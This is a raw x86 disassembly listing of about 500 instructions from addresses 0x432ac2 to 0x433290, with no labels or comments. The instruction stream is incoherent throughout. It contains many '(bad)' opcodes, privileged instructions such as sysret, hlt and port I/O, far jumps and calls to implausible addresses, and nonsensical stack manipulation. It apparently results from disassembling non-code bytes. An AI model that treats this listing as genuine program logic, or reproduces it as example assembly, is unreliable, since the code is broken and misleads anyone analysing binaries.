  432ac2:	cld    
  432ac3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432aca:	push   0xffffff83
  432acc:	pop    edi
  432acd:	or     BYTE PTR [ebp+0x53],dh
  432ad0:	xorps  xmm1,xmm2
  432ad3:	test   BYTE PTR [eax+eax*1],bh
  432ad6:	add    BYTE PTR [eax],al
  432ad8:	adc    eax,eax
  432ada:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ae2:	jmp    DWORD PTR [eax]
  432ae4:	ror    al,0x5e
  432ae7:	inc    ebp
  432ae8:	leave  
  432ae9:	xor    ecx,DWORD PTR [eax]
  432aeb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432af1:	add    ah,al
  432af3:	xor    edi,edi
  432af5:	xor    DWORD PTR [ebx],0x66003302
  432afb:	mov    DWORD PTR [ebp-0xc],ecx
  432afe:	pcmpgtw mm0,mm0
  432b01:	add    dl,ah
  432b03:	leave  
  432b04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432b08:	push   eax
  432b09:	dec    ebp
  432b0a:	mov    esi,DWORD PTR [ebx-0x75]
  432b0d:	lea    ebp,[eax-0x7c00ff02]
  432b13:	xor    eax,DWORD PTR [eax]
  432b15:	sysret 
  432b17:	dec    ebp
  432b18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b1f:	push   WORD PTR [ecx+0x8]
  432b23:	jne    0x432ae6
  432b25:	ud0    ecx,DWORD PTR [ecx]
  432b28:	mov    eax,edx
  432b2a:	lods   al,BYTE PTR ds:[esi]
  432b2b:	add    BYTE PTR [eax],al
  432b2d:	data16 (bad) 
  432b2f:	iret   
  432b30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b37:	cli    
  432b38:	inc    ebp
  432b39:	cmp    al,0x8d
  432b3b:	add    BYTE PTR [esi+0x2d],ah
  432b3e:	inc    ebp
  432b3f:	pop    ebp
  432b40:	lea    ecx,[edi]
  432b42:	mov    dl,bh
  432b44:	add    BYTE PTR [edi],cl
  432b46:	mov    DWORD PTR [eax+eax*8],edi
  432b49:	mov    ebx,0x3b87
  432b4e:	add    BYTE PTR [ebx],ch
  432b50:	inc    ebp
  432b51:	data16 (bad) 
  432b53:	clc    
  432b54:	int3   
  432b55:	cmp    eax,DWORD PTR [eax]
  432b57:	je     0x432ae2
  432b59:	push   0xffffffc8
  432b5b:	pop    edi
  432b5c:	xchg   DWORD PTR [ebp+0x0],eax
  432b5f:	data16 add BYTE PTR [ebp+0x45],cl
  432b63:	lea    cx,[ebp+0x10]
  432b67:	jb     0x432b69
  432b69:	jmp    0x432af4
  432b6b:	call   eax
  432b6d:	clc    
  432b6e:	xchg   DWORD PTR [edi+0x1],edi
  432b71:	mov    eax,DWORD PTR [eax]
  432b73:	or     BYTE PTR [ebp-0x49],al
  432b76:	lea    eax,[eax+0x74003154]
  432b7c:	push   edi
  432b7d:	inc    edx
  432b7e:	jge    0x432b7f
  432b80:	mov    DWORD PTR [edi],ecx
  432b82:	fdiv   DWORD PTR [edi-0x6]
  432b85:	inc    DWORD PTR [eax]
  432b87:	xor    edx,DWORD PTR [eax+0x5f]
  432b8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432b8d:	ret    0x0
  432b90:	xor    BYTE PTR [ebp-0x51],cl
  432b93:	cmp    edi,0xf0ff89fe
  432b99:	data16 ror al,0x84
  432b9d:	rol    BYTE PTR [eax],0x3b
  432ba0:	add    al,dh
  432ba2:	dec    eax
  432ba3:	xchg   esp,eax
  432ba4:	push   ebx
  432ba5:	jmp    0x432b32
  432ba7:	push   ebp
  432ba8:	add    esp,ebp
  432baa:	add    ebp,esp
  432bac:	mov    edx,DWORD PTR [edi+0x24]
  432baf:	clc    
  432bb0:	dec    esi
  432bb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432bb7:	cmp    BYTE PTR [ebx],al
  432bb9:	jne    0x432b44
  432bbb:	xor    esp,eax
  432bbd:	jmp    0x462d40
  432bc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bc5:	jne    0x432bbb
  432bc7:	call   0xffcd2921
  432bcc:	clc    
  432bcd:	xchg   edi,eax
  432bce:	sti    
  432bcf:	add    DWORD PTR [ebx],eax
  432bd1:	add    BYTE PTR [ebp+0x47],bl
  432bd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bda:	pop    ebp
  432bdb:	mov    DWORD PTR [esi-0x48],esi
  432bde:	jmp    0x432c27
  432be0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432be6:	(bad)  
  432be8:	cmp    al,0x0
  432bea:	cmp    eax,DWORD PTR [ebp+0x18]
  432bed:	lea    ebx,[ebp-0x56]
  432bf0:	jle    0x432bf2
  432bf2:	jae    0x432b7d
  432bf4:	mov    eax,esp
  432bf6:	call   0xb900:0x8b005587
  432bfd:	inc    ebp
  432bfe:	push   ebp
  432bff:	lea    ecx,[ebp-0x27ff4f12]
  432c05:	mov    eax,edi
  432c07:	int3   
  432c08:	push   ebp
  432c09:	xchg   edi,eax
  432c0b:	add    esp,ebp
  432c0d:	add    BYTE PTR [eax],al
  432c0f:	inc    ebp
  432c10:	add    BYTE PTR [ebp+0x8b3255],cl
  432c16:	cld    
  432c17:	mov    DWORD PTR [edx],edi
  432c19:	aam    0x75
  432c1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c21:	mov    DWORD PTR [ebx-0x50],edx
  432c24:	test   BYTE PTR [ebp-0x1],0xe8
  432c28:	mov    eax,DWORD PTR [eax]
  432c2a:	hlt    
  432c2b:	add    al,al
  432c2d:	mov    eax,DWORD PTR ds:0x890045a8
  432c33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c39:	inc    DWORD PTR [eax*2+0xf75854d]
  432c40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c46:	call   0x72998987
  432c4b:	je     0x432cab
  432c4d:	js     0x432cae
  432c4f:	lock ret 0x7e
  432c53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c59:	mov    edi,edi
  432c5b:	sbb    al,bl
  432c5d:	clc    
  432c5e:	add    BYTE PTR [ebp-0x73],bh
  432c61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c67:	ror    BYTE PTR [eax],1
  432c69:	dec    ebp
  432c6a:	xchg   ebp,eax
  432c6b:	mov    edi,edi
  432c6d:	in     al,0x8b
  432c6f:	jge    0x432bfa
  432c71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c77:	clc    
  432c78:	pop    esi
  432c79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c7f:	clc    
  432c80:	add    al,0x6e
  432c82:	mov    eax,DWORD PTR [ebx]
  432c84:	mov    BYTE PTR [ebp+0x0],dl
  432c87:	mov    edx,DWORD PTR [ebx-0x20]
  432c8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c90:	add    eax,0x3b3b73
  432c95:	adc    al,0x89
  432c97:	pop    eax
  432c98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c9c:	ret    0xf08
  432c9f:	cmp    al,0x2
  432ca1:	mov    edx,eax
  432ca3:	cld    
  432ca4:	add    BYTE PTR [ebp+0x66],dl
  432ca7:	add    eax,ebx
  432ca9:	add    esp,eax
  432cab:	sub    eax,eax
  432cad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432cb3:	add    BYTE PTR [eax],al
  432cb5:	mov    DWORD PTR [ebx-0x24],ebx
  432cb8:	push   edi
  432cb9:	push   ebp
  432cba:	clc    
  432cbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432cc2:	out    0xff,eax
  432cc4:	add    edx,DWORD PTR [eax]
  432cc6:	jmp    0x432cb0
  432cc8:	cmp    ch,0x46
  432ccb:	(bad)  
  432ccc:	jmp    0x40c8b51e
  432cd1:	je     0x432c5d
  432cd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cd9:	inc    ebp
  432cda:	add    BYTE PTR [ebx-0x770375],al
  432ce0:	add    ah,ch
  432ce2:	add    edx,esp
  432ce4:	pop    edi
  432ce5:	pop    ebp
  432ce6:	push   ebp
  432ce7:	inc    ebx
  432ce8:	in     al,dx
  432ce9:	pop    ebp
  432cea:	in     al,dx
  432ceb:	cmp    edx,DWORD PTR [edi-0x8]
  432cee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432cf5:	add    al,0x47
  432cf7:	push   ebp
  432cf8:	mov    esp,ebp
  432cfa:	in     al,0x45
  432cfc:	dec    ebp
  432cfd:	push   esi
  432cfe:	test   DWORD PTR [eax+0xfb010f],esi
  432d04:	add    BYTE PTR [eax+0xc018b],dh
  432d0a:	leave  
  432d0b:	inc    ebp
  432d0c:	test   al,ch
  432d0e:	add    dh,bh
  432d10:	add    bh,bh
  432d12:	dec    ebp
  432d13:	push   cs
  432d14:	mov    DWORD PTR [ecx],eax
  432d16:	hlt    
  432d17:	push   es
  432d18:	dec    ebp
  432d19:	leave  
  432d1a:	mov    DWORD PTR [eax],ecx
  432d1c:	clc    
  432d1d:	cmovge eax,ecx
  432d20:	mov    ecx,0x85c2f0
  432d26:	clc    
  432d27:	pop    DWORD PTR [ebp+0x1]
  432d2a:	push   ebx
  432d2b:	add    BYTE PTR [ebp-0x15],bh
  432d2e:	push   esi
  432d2f:	xor    eax,0x898a45
  432d34:	cld    
  432d35:	add    al,BYTE PTR [ebp+0x0]
  432d38:	xor    esp,DWORD PTR [esi-0x64]
  432d3b:	add    DWORD PTR [esi+0x78308c1],edi
  432d41:	add    ah,BYTE PTR [ebp-0x49]
  432d44:	int    0xbb
  432d46:	mov    ecx,DWORD PTR [esi+0xc]
  432d49:	add    dh,al
  432d4b:	cmp    ecx,ebx
  432d4d:	jne    0x432d17
  432d4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432d52:	jmp    0xca2d58
  432d57:	add    DWORD PTR [ebp+0x0],eax
  432d5a:	mov    eax,ebx
  432d5c:	or     al,0x8b
  432d5e:	(bad)  
  432d5f:	mov    ecx,esi
  432d61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d68:	mov    eax,edi
  432d6a:	or     BYTE PTR [edx],cl
  432d6c:	shl    cl,cl
  432d6e:	icebp  
  432d6f:	add    BYTE PTR [ebp+0x38],0x8b
  432d73:	or     BYTE PTR [edx+eax*2],cl
  432d76:	(bad)  
  432d77:	or     cl,dh
  432d79:	stc    
  432d7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432d7e:	xor    al,0x0
  432d80:	inc    ebp
  432d81:	xchg   BYTE PTR [ebx],al
  432d83:	add    esp,edi
  432d85:	add    BYTE PTR [ebp-0x39],cl
  432d88:	mov    al,bl
  432d8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d90:	sub    al,0xbf
  432d92:	jmp    0x432d19
  432d94:	mov    edi,eax
  432d96:	lock jge 0x432d8a
  432d99:	lea    esi,[edx-0x74bad5ff]
  432d9f:	mov    ebp,esp
  432da1:	or     cl,dh
  432da3:	leave  
  432da4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432dab:	dec    ebp
  432dac:	dec    ebp
  432dad:	test   DWORD PTR [ebx],eax
  432daf:	paddb  mm6,mm0
  432db2:	add    DWORD PTR [eax],eax
  432db4:	dec    ebp
  432db5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432dbb:	mov    esi,DWORD PTR [edx]
  432dbd:	or     al,0x2b
  432dbf:	dec    ebp
  432dc0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432dc6:	mov    esp,edi
  432dc8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dcf:	mov    DWORD PTR [ebx],ebp
  432dd1:	call   0xc76b701
  432dd6:	mov    DWORD PTR [ebp+0x10],ecx
  432dd9:	(bad)  
  432dda:	push   0x8b85ff10
  432ddf:	clc    
  432de0:	or     al,0x54
  432de2:	(bad)  
  432de3:	push   ecx
  432de4:	retf   
  432de5:	mov    ebx,0xff4d8dc8
  432dea:	mov    DWORD PTR [ebp+0x8],eax
  432ded:	xor    eax,DWORD PTR [ebp-0x75]
  432df0:	cmp    ebp,DWORD PTR [ebx]
  432df2:	lsl    ebx,WORD PTR [edi-0x8]
  432df6:	call   DWORD PTR [ebx-0x741bff75]
  432dfc:	(bad)  
  432dfd:	or     al,0x5b
  432dff:	dec    ebp
  432e00:	or     BYTE PTR [ebx],dh
  432e02:	inc    ebp
  432e03:	xor    esi,DWORD PTR ds:0x708088d
  432e09:	in     eax,0x9b
  432e0b:	add    BYTE PTR [edx],dh
  432e0d:	inc    ebp
  432e0e:	pop    edi
  432e0f:	xor    eax,edx
  432e11:	test   DWORD PTR [eax],0x81108b8b
  432e17:	dec    ebp
  432e18:	sub    al,0x33
  432e1a:	add    BYTE PTR [ebx],dh
  432e1c:	push   esi
  432e1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e23:	mov    edi,eax
  432e25:	or     BYTE PTR [ebp+0x45],al
  432e28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e2e:	xor    ecx,ecx
  432e30:	pushf  
  432e31:	push   es
  432e32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e39:	dec    ebp
  432e3a:	inc    ebp
  432e3b:	cmp    BYTE PTR [ecx],0x54
  432e3e:	pushf  
  432e3f:	gs (bad) 
  432e41:	shl    esp,1
  432e43:	dec    ebp
  432e44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e4a:	shr    ecx,1
  432e4c:	xlat   BYTE PTR ds:[ebx]
  432e4d:	rol    bh,cl
  432e4f:	mov    edx,esp
  432e51:	or     BYTE PTR [ebp+0x4588f84d],al
  432e57:	mov    ecx,DWORD PTR [eax]
  432e59:	or     BYTE PTR [eax],al
  432e5b:	push   ebp
  432e5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e62:	dec    ebp
  432e63:	enter  0xceba,0x8
  432e67:	retf   0x1807
  432e6a:	ret    0x9b4d
  432e6d:	mov    esi,DWORD PTR [edx]
  432e6f:	or     al,0x33
  432e71:	into   
  432e72:	add    edx,esi
  432e74:	add    ecx,edx
  432e76:	bswap  eax
  432e78:	ror    esi,0x98
  432e7b:	dec    ebp
  432e7c:	add    cl,ch
  432e7e:	mov    edi,edi
  432e80:	hlt    
  432e81:	inc    esi
  432e83:	inc    ebp
  432e84:	ret    0x4533
  432e87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e8d:	or     BYTE PTR [ebx],dh
  432e8f:	dec    ebp
  432e90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e96:	jne    0xff8d2e5d
  432e9c:	inc    ebp
  432e9d:	inc    ebp
  432e9e:	mov    esi,DWORD PTR [ebx]
  432ea0:	clc    
  432ea1:	pop    esi
  432ea2:	ret    0xcaeb
  432ea5:	mov    eax,esi
  432ea7:	call   0x5204837a
  432eac:	dec    ebp
  432ead:	add    eax,0xf8728b
  432eb2:	adc    eax,0xce0ccac9
  432eb7:	push   ebp
  432eb8:	ret    0xc6ec
  432ebb:	in     al,dx
  432ebc:	call   0x33437bc5
  432ec1:	push   edi
  432ec2:	add    edi,eax
  432ec4:	xor    eax,eax
  432ec6:	jmp    0x432f0d
  432ec8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432ece:	add    eax,edi
  432ed0:	shr    eax,cl
  432ed2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ed8:	mov    esi,DWORD PTR [edx]
  432eda:	in     al,dx
  432edb:	pushf  
  432edc:	ret    0x84c7
  432edf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ee5:	inc    ebp
  432ee6:	in     al,dx
  432ee7:	xor    DWORD PTR [ebp-0x64],eax
  432eea:	mov    eax,edi
  432eec:	cld    
  432eed:	fmul   st(2),st
  432eef:	sbb    dl,al
  432ef1:	jmp    0x9c3b:0x304d45c1
  432ef8:	jbe    0x432ec1
  432efa:	mov    esp,eax
  432efc:	clc    
  432efd:	add    BYTE PTR [ebp+0x0],cl
  432f00:	mov    ecx,ecx
  432f02:	lea    eax,[ebp-0x5]
  432f05:	mov    edi,edi
  432f07:	call   0x51ce8351
  432f0c:	hlt    
  432f0d:	xor    eax,edx
  432f0f:	mov    esi,0x9b7284
  432f14:	xor    cl,dl
  432f16:	mov    esi,eax
  432f18:	hlt    
  432f19:	into   
  432f1a:	inc    ebp
  432f1b:	scas   eax,DWORD PTR es:[edi]
  432f1c:	mov    ebp,ecx
  432f1e:	cld    
  432f1f:	add    dl,cl
  432f21:	add    dl,al
  432f23:	inc    ebp
  432f24:	shr    DWORD PTR [ebx],0x4d
  432f27:	xor    edi,DWORD PTR [ebx]
  432f29:	mov    DWORD PTR [edi],ecx
  432f2b:	clc    
  432f2c:	dec    esi
  432f2d:	inc    ebp
  432f2e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f34:	ret    0xc6ca
  432f37:	mov    BYTE PTR [ebp-0x32],0x53
  432f3b:	scas   eax,DWORD PTR es:[edi]
  432f3c:	inc    ebp
  432f3d:	jmp    0x432f6f
  432f3f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f46:	pop    ebx
  432f47:	xor    ecx,DWORD PTR [ebp+0x3]
  432f4a:	mov    eax,DWORD PTR [ebx]
  432f4c:	clc    
  432f4d:	test   edx,ecx
  432f4f:	mov    ecx,esi
  432f51:	cld    
  432f52:	call   0x8ab7749c
  432f57:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f5d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f63:	fdiv   QWORD PTR [ebx]
  432f65:	retf   0xce89
  432f68:	in     al,0xc1
  432f6a:	inc    ebp
  432f6b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f71:	into   
  432f72:	mov    dh,0xc1
  432f75:	call   0x8c1774fe
  432f7a:	(bad)  
  432f7b:	cld    
  432f7c:	mov    ecx,DWORD PTR [ebp-0x14]
  432f7f:	xor    eax,ecx
  432f81:	lea    eax,[ebp+0x8]
  432f84:	mov    esi,DWORD PTR [edx-0x4]
  432f87:	add    dl,al
  432f89:	inc    ebp
  432f8a:	mov    esp,0x32d89b8b
  432f8f:	dec    ebp
  432f90:	mov    esi,DWORD PTR [ebx]
  432f92:	cld    
  432f93:	xor    eax,edx
  432f95:	sub    esp,DWORD PTR [ebp-0x75]
  432f98:	int    0xec
  432f9a:	sub    ecx,eax
  432f9c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432fa2:	mov    esi,esp
  432fa4:	call   0x34177d2d
  432fa9:	inc    DWORD PTR [ebx]
  432fab:	mov    edi,DWORD PTR [ebx]
  432fad:	cld    
  432fae:	jne    0x432ffd
  432fb0:	mov    esi,DWORD PTR [ebx]
  432fb2:	aam    0x8d
  432fb4:	dec    ebp
  432fb5:	or     BYTE PTR [ebx],dh
  432fb7:	jb     0x432fbc
  432fb9:	add    BYTE PTR [edi+0x45],bl
  432fbc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432fc3:	xor    ebp,esp
  432fc5:	xor    eax,edi
  432fc7:	sub    edi,esp
  432fc9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fcf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fd6:	inc    ebp
  432fd7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fdd:	clc    
  432fde:	mov    eax,edi
  432fe0:	nop
  432fe1:	fadd   QWORD PTR [eax]
  432fe3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fe9:	jmp    0x432f74
  432feb:	mov    eax,DWORD PTR [ecx]
  432fed:	fadd   DWORD PTR [eax]
  432fef:	inc    ebp
  432ff0:	or     DWORD PTR [ebx],esi
  432ff2:	dec    eax
  432ff3:	add    edx,DWORD PTR [ebx-0x2d]
  432ff6:	dec    ebp
  432ff7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432ffd:	inc    ebp
  432ffe:	push   esp
  432fff:	mov    dl,BYTE PTR [ecx-0xd]
  433002:	xor    ecx,DWORD PTR [ebp-0x45]
  433005:	(bad)  
  433007:	rol    BYTE PTR [eax],0xc1
  43300a:	ret    
  43300b:	inc    ebp
  43300c:	inc    ebp
  43300d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433013:	xor    eax,ebx
  433015:	add    eax,DWORD PTR [ebp+0x23]
  433018:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43301e:	cmp    edi,0xc
  433021:	dec    ebp
  433022:	inc    ebp
  433023:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433029:	inc    ebp
  43302a:	mov    esi,DWORD PTR [ebx]
  43302c:	clc    
  43302d:	lea    eax,[ebp+0x45725407]
  433033:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433037:	xor    edi,DWORD PTR [eax]
  433039:	mov    ecx,0xff8b8d4d
  43303e:	push   esp
  43303f:	enter  0x4df7,0x23
  433043:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433049:	mov    eax,DWORD PTR [ebx]
  43304b:	loopne 0x433038
  43304d:	ret    0xc68b
  433050:	push   esp
  433051:	enter  0x9745,0x8b
  433055:	inc    ebp
  433056:	cld    
  433057:	mov    eax,edi
  433059:	clc    
  43305a:	ret    
  43305b:	ret    0xc645
  43305e:	mov    esi,DWORD PTR [ebx]
  433060:	cld    
  433061:	pop    esi
  433062:	mov    ebx,0x83458bc3
  433068:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43306c:	dec    ebp
  43306d:	xor    DWORD PTR [ebx],esi
  43306f:	pushf  
  433070:	add    edi,DWORD PTR [edx-0x7767a77]
  433076:	fcom   DWORD PTR [ebp+0x45]
  433079:	mov    esi,DWORD PTR [ebx]
  43307b:	adc    al,0x9c
  43307d:	inc    ebp
  43307e:	(bad)  
  43307f:	mov    ebx,eax
  433081:	adc    al,0x85
  433083:	cmp    al,0x1
  433086:	inc    ebp
  433087:	add    BYTE PTR ds:0xe98b9c4d,bh
  43308d:	mov    eax,DWORD PTR [ebx]
  43308f:	nop
  433090:	add    BYTE PTR [eax],al
  433092:	inc    ebp
  433093:	mov    esi,DWORD PTR [ebx]
  433095:	add    eax,DWORD PTR [ebx]
  433097:	cmp    al,0x89
  433099:	mov    esp,esi
  43309b:	clc    
  43309c:	inc    ebp
  43309d:	inc    ebp
  43309e:	add    edx,DWORD PTR [esi+0xc]
  4330a1:	mov    edi,0x7ff0845
  4330a6:	in     al,dx
  4330a7:	(bad)  
  4330a8:	jne    0x433045
  4330aa:	mov    esi,DWORD PTR [edx]
  4330ac:	clc    
  4330ad:	add    ebp,DWORD PTR [esi]
  4330af:	mov    edi,edi
  4330b1:	in     al,dx
  4330b2:	mov    DWORD PTR [ebp-0x10],eax
  4330b5:	xor    eax,DWORD PTR [ebp+0x3]
  4330b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330be:	fmul   DWORD PTR [ebx-0x173caf39]
  4330c4:	lea    ecx,[ecx+0x45e8d4bc]
  4330ca:	clc    
  4330cb:	mov    edi,edi
  4330cd:	cmp    BYTE PTR [ebp+0x4d],al
  4330d0:	test   DWORD PTR [eax+0x74],ecx
  4330d3:	inc    ecx
  4330d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330da:	ret    
  4330db:	inc    eax
  4330dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330e2:	push   eax
  4330e3:	dec    eax
  4330e4:	test   al,0xd0
  4330e6:	dec    eax
  4330e8:	mov    eax,DWORD PTR [ebp-0x14]
  4330eb:	mov    eax,DWORD PTR [ebp+0x38]
  4330ee:	mov    eax,ecx
  4330f0:	fadd   DWORD PTR [ebx]
  4330f2:	dec    ebp
  4330f3:	inc    eax
  4330f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330fa:	inc    ebp
  4330fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433101:	fadd   QWORD PTR [ebx]
  433103:	inc    ebp
  433104:	or     al,0x33
  433106:	dec    ebp
  433107:	add    edi,DWORD PTR [ebx]
  433109:	mov    DWORD PTR [edx-0x28],esi
  43310c:	mov    eax,DWORD PTR [ebp-0x10]
  43310f:	mov    eax,DWORD PTR [eax+0x10]
  433112:	mov    eax,edi
  433114:	lock ret 
  433116:	inc    ecx
  433117:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43311d:	fsubr  st,st(5)
  43311f:	test   DWORD PTR [eax],eax
  433121:	clc    
  433122:	push   0x45
  433124:	(bad)  
  433125:	cmp    al,0xec
  433127:	pushf  
  433128:	inc    ebp
  433129:	(bad)  
  43312a:	push   eax
  43312b:	fsub   DWORD PTR [eax-0x7b]
  43312e:	(bad)  
  43312f:	clc    
  433130:	mov    eax,0xf8008584
  433135:	mov    eax,DWORD PTR [ebp-0x4]
  433138:	mov    edi,0x4585c3cc
  43313e:	clc    
  43313f:	mov    eax,DWORD PTR [ebp+0x14]
  433142:	xor    eax,DWORD PTR [ebp-0x64]
  433145:	mov    edi,eax
  433147:	in     al,dx
  433148:	les    esi,FWORD PTR [ebp-0x7b]
  43314b:	mov    edi,eax
  43314d:	or     al,0x4d
  43314f:	dec    ebp
  433150:	mov    eax,ebp
  433152:	in     al,0xf2
  433154:	dec    ebp
  433155:	dec    DWORD PTR [ecx+0x4dc7e045]
  43315b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433161:	inc    ebp
  433162:	mov    DWORD PTR [ebx],esi
  433164:	fadd   QWORD PTR [ebx]
  433166:	dec    ebp
  433167:	push   eax
  433168:	xor    eax,DWORD PTR [ebp+0x3]
  43316b:	push   eax
  43316c:	mov    DWORD PTR [eax+ebx*8],ebx
  43316f:	push   esi
  433171:	mov    eax,DWORD PTR [eax]
  433173:	lock cmp eax,0xf84e85c0
  433179:	inc    ebp
  43317a:	test   BYTE PTR [ebx],dh
  43317c:	add    DWORD PTR [ebx],eax
  43317e:	add    BYTE PTR [eax+0x4d],dl
  433181:	jne    0x4331b6
  433183:	lea    ecx,[ebx-0x7617fc44]
  433189:	div    ah
  43318b:	inc    DWORD PTR [ebp+0x45]
  43318e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433194:	jb     0x433121
  433196:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43319d:	mov    ecx,DWORD PTR [ebp-0x10]
  4331a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4331a3:	mov    edi,DWORD PTR [ebx]
  4331a5:	adc    BYTE PTR [ebp+0x41],dh
  4331a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4331ae:	ret    
  4331af:	push   ss
  4331b0:	push   0x45
  4331b2:	lea    ecx,[ebx+0x4de80cb0]
  4331b8:	sti    
  4331b9:	add    edi,edi
  4331bb:	or     BYTE PTR [ebp+0x4d],al
  4331be:	mov    ebp,DWORD PTR [ebx]
  4331c0:	xor    ebp,ecx
  4331c2:	mov    al,BYTE PTR [edx]
  4331c4:	add    eax,0xc7200
  4331c9:	jne    0x433218
  4331cb:	lea    esi,[ebx]
  4331cd:	mov    al,0xf
  4331cf:	call   0xf2894
  4331d4:	shl    DWORD PTR [ecx],0x84
  4331d7:	pushf  
  4331d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331de:	mov    esi,DWORD PTR [edx]
  4331e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331e7:	test   DWORD PTR [eax],eax
  4331e9:	clc    
  4331ea:	dec    ebp
  4331eb:	inc    ebp
  4331ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4331ef:	pushf  
  4331f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331f7:	lea    eax,[ecx]
  4331f9:	int3   
  4331fa:	add    BYTE PTR [ebp+0x45],cl
  4331fd:	lea    ecx,[ebx-0x75b2cc38]
  433203:	lea    eax,ds:0x4d72c4
  433209:	mov    ecx,DWORD PTR [ebp-0x4]
  43320c:	xor    ecx,edi
  43320e:	bswap  ebx
  433210:	ror    BYTE PTR [ebp-0x35],0xe9
  433214:	rol    DWORD PTR [ecx],0x84
  433217:	add    BYTE PTR [ecx],al
  433219:	xor    eax,DWORD PTR [eax]
  43321b:	pushf  
  43321c:	inc    ebp
  43321d:	jnp    0x8a436620
  433223:	mov    eax,DWORD PTR ds:0xcf72e8
  433229:	lock dec ebp
  43322b:	retf   
  43322c:	xor    ecx,DWORD PTR [ebp+0xf]
  43322f:	mov    eax,eax
  433231:	fmul   st,st(3)
  433233:	test   ecx,0x19b8484
  433239:	xor    al,BYTE PTR [eax]
  43323b:	mov    DWORD PTR [ebp-0x28],eax
  43323e:	mov    eax,DWORD PTR [ebp+0x33]
  433241:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433247:	ret    
  433248:	add    al,cl
  43324a:	dec    ebp
  43324b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433251:	add    ecx,DWORD PTR ds:0xc7250
  433257:	inc    ebp
  433258:	rcl    DWORD PTR [eax+0x4d],0x2b
  43325c:	mov    edi,edi
  43325e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433264:	jb     0x43322d
  433266:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43326d:	mov    esi,DWORD PTR [ebx]
  43326f:	cld    
  433270:	mov    cl,bh
  433272:	or     eax,0x372b6
  433277:	cmp    ecx,eax
  433279:	jne    0x4332f6
  43327f:	mov    eax,DWORD PTR [ebp-0x20]
  433282:	mov    eax,DWORD PTR [eax]
  433284:	xor    eax,edi
  433286:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43328d:	mov    ecx,DWORD PTR [ebp-0x4]
  433290:	mov    ecx,edi
